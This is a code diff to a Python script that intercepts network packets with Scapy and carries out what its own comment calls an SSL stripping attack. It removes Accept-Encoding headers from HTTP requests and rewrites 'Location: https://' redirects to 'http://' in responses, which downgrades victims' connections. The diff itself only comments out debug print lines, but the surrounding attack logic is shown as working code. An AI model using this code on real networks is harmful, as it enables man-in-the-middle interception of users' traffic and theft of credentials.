@@ -11,8 +11,8 @@ def process_traffic(packet):
     # Convert packet to a Scapy packet
     p = IP(packet.get_payload())
 
-    print("Packet intercepted: ")
-    print(p.show())
+    #print("Packet intercepted: ")
+    #print(p.show())
 
     # Check if the packet has a Raw layer, where the HTTP message is located
     # so check if payload of the packet contains HTTP data
@@ -27,12 +27,12 @@ def process_traffic(packet):
             if p[TCP].dport == 80:
                 # remove the Accept-Encoding header from the HTTP request
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-                print(load)
+                #print(load)
             # source port 80 is the default port for HTTP traffic
             elif p[TCP].sport == 80:
                 # remove the Content-Encoding header from the HTTP response
                 load = re.sub("Location: https://", "Location: http://", load)
-                print(load)
+                #print(load)
 
         # If the load was modified, update the packet
         if load != p[Raw].load:
@@ -46,6 +46,7 @@ def process_traffic(packet):
             packet.set_payload(str(p))
 
     # accept the packet and forward it to its destination
+    # print(p.show())
     packet.accept()
 
 # start SSL stripping attack
@@ -69,7 +70,7 @@ def start_proxy():
 # Handle the incoming connection
 def handle_connection(conn, addr):
     data = conn.recv(1024)
-    print("Received data: ", data)
+    #print("Received data: ", data)
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
